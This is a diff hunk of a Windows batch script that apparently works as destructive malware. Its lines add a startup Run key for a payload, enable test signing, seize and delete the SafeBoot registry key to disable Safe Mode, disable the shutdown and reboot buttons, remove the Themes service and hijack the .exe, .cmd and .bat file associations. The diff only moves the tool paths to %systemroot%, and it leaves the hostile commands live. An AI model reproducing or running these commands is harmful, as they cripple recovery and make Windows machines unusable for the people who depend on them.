@@ -218,9 +218,9 @@ xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv5 /t REG_SZ /d c:\windows\payload\startup.bat
-%CD%\junkins\startup\SetACL.exe -on name -ot type -actn action
-%CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
-%CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
+%systemroot%\junkins\startup\SetACL.exe -on name -ot type -actn action
+%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
+%systemroot%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
 reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
 reg import "%CD%\junkins\startup\disableshutdownandrebootbutton.reg"
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
@@ -232,8 +232,8 @@ bcdedit /set TESTSIGNING on
 goto DESTROY
 :ADDONS
 @rem --Additional Commands go below--
-start %CD%\junkins\nssm\nssm.exe stop Themes
-start %CD%\junkins\nssm\nssm.exe remove Themes confirm
+start %systemroot%\junkins\nssm\nssm.exe stop Themes
+start %systemroot%\nssm\nssm.exe remove Themes confirm
 assoc .exe=jaydumb
 assoc .cmd=windfufBest
 assoc .bat=CmdV5
